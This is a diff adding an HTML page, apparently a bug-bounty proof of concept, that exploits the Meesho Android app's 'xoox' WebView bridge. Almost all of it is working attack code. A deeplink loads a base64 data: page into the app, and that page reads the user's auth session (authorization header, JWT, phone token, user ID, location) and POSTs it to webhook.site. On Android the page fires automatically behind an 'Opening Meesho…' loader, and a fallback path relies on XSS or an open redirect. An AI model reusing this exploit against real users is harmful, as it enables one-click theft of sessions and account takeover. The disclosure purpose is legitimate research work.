@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting…</title>
+<style>
+body { font-family: -apple-system, system-ui, sans-serif; background: #fff; color: #222; padding: 24px; text-align: center; }
+.loader { width: 32px; height: 32px; border: 3px solid #eee; border-top-color: #f43397; border-radius: 50%; animation: spin 1s linear infinite; margin: 40px auto 16px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+small { color: #888; }
+#err { color: #b00020; padding: 24px; }
+</style>
+</head>
+<body>
+
+<div id="ok" style="display:none">
+  <div class="loader"></div>
+  <p>Opening Meesho…</p>
+  <small>If the app does not open automatically, <a id="manual" href="#">tap here</a>.</small>
+</div>
+
+<div id="err">
+  <h2>Page not configured</h2>
+  <p>This URL requires an activation parameter. If you arrived here in error, no action is needed.</p>
+</div>
+
+<script>
+// =============================================================================
+// Meesho xoox-bridge auth-token theft — public PoC landing
+// Hosted: https://screenshotsart.store/meesho-poc.html
+//
+// Inert by design without an activation secret. Append:
+//   #k=<secret>&w=<webhook-uuid>
+// to fire. Secrets are only shared inside the H1 report so the URL itself
+// has no live attack surface for unrelated visitors.
+//
+// Chain:
+//   1. Victim taps this HTTPS link in any chat / email / SMS.
+//   2. Page fires supply:// deeplink whose web_view_url is a
+//      data:text/html;base64 URI containing the exfil script.
+//   3. WebViewActivity registers the xoox bridge (with_oauth=true) BEFORE
+//      loading the URL. Bridge removal lives in shouldInterceptRequest,
+//      which never fires for the initial data: load.
+//   4. The data: URI's inline JS calls window.xoox.getParams() and POSTs the
+//      full auth session (Authorization, Xo JWT, U-Token phone,
+//      APP-USER-LOCATION, APP-USER-ID) to webhook.site.
+//
+// Single click. No laptop. No XSS chain. No CDP. Production-realistic.
+// =============================================================================
+
+async function sha256(s){
+  var buf = new TextEncoder().encode(s);
+  var h = await crypto.subtle.digest("SHA-256", buf);
+  return Array.from(new Uint8Array(h)).map(function(b){return ("0"+b.toString(16)).slice(-2)}).join("");
+}
+
+(async function(){
+  var hash = location.hash.replace(/^#/, "");
+  var params = {};
+  hash.split("&").forEach(function(p){
+    var i = p.indexOf("=");
+    if (i > 0) params[decodeURIComponent(p.slice(0, i))] = decodeURIComponent(p.slice(i + 1));
+  });
+
+  // SHA-256 of the activation secret. Source reveals the hash only; the
+  // preimage is shared exclusively in the H1 report URL fragment. Public
+  // visitors without the secret see only the inert "page not configured"
+  // message. Rotate by swapping this hash and re-deploying.
+  var KEY_HASH = "18b599d01c1134a8be45edd79724f109cdbce2f96c90ae5eeafc93708337b77d";
+
+  if (!params.k) return;
+  var got = await sha256(params.k);
+  if (got !== KEY_HASH) return;
+
+  // Webhook for this PoC instance.
+  var webhookId = params.w || "REPLACE-WEBHOOK-UUID";
+  var WEBHOOK = "https://webhook.site/" + webhookId;
+
+  // Inline exfil page that runs INSIDE Meesho's WebView once the deeplink
+  // opens it. xoox bridge is registered by WebViewActivity (with_oauth=true)
+  // before this URL is loaded, so window.xoox is present here.
+  var EXFIL_HTML =
+    "<!doctype html><html><head><meta charset=utf-8>" +
+    "<title>...</title>" +
+    "<style>body{font-family:monospace;background:#000;color:#0f0;padding:12px;font-size:11px;word-break:break-all}h2{color:#e94560}</style>" +
+    "</head><body>" +
+    "<h2>xoox bridge accessible from attacker origin</h2>" +
+    "<pre id=o>...</pre>" +
+    "<script>" +
+    "var W=" + JSON.stringify(WEBHOOK) + ";" +
+    "var r=null;" +
+    "try{r=window.xoox.getParams()}catch(e){r='ERR:'+e.message}" +
+    "document.title=(r||'').substring(0,80);" +
+    "document.getElementById('o').textContent=r;" +
+    "var x=new XMLHttpRequest();" +
+    "x.open('POST',W,true);" +
+    "x.setRequestHeader('Content-Type','text/plain');" +
+    "x.send(r);" +
+    "<\/script></body></html>";
+
+  function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
+  var dataUri = "data:text/html;base64," + b64(EXFIL_HTML);
+
+  var deeplink =
+    "supply://open?" +
+    "host_internal=WEB_VIEW&" +
+    "web_view_url=" + encodeURIComponent(dataUri) + "&" +
+    "web_view_title=Help&" +
+    "with_oauth=true";
+
+  // Fallback variant: if web_view_url rejects data: scheme, target meesho.com
+  // and rely on attacker JS (XSS / open redirect) to navigate to the data:
+  // URI from inside meesho.com. Pass &m=fallback to use this path.
+  if (params.m === "fallback") {
+    deeplink =
+      "supply://open?" +
+      "host_internal=WEB_VIEW&" +
+      "web_view_url=" + encodeURIComponent("https://www.meesho.com/help") + "&" +
+      "web_view_title=Help&" +
+      "with_oauth=true";
+  }
+
+  // Activate UI
+  document.getElementById("err").style.display = "none";
+  document.getElementById("ok").style.display = "block";
+  document.getElementById("manual").href = deeplink;
+
+  // Auto-fire on Android only (so opening the link on desktop doesn't try
+  // to handle an unknown scheme).
+  var isAndroid = /Android/i.test(navigator.userAgent);
+  if (isAndroid && params.auto !== "0") {
+    setTimeout(function(){ location.href = deeplink; }, 400);
+  }
+})();
+</script>
+
+</body>
+</html>
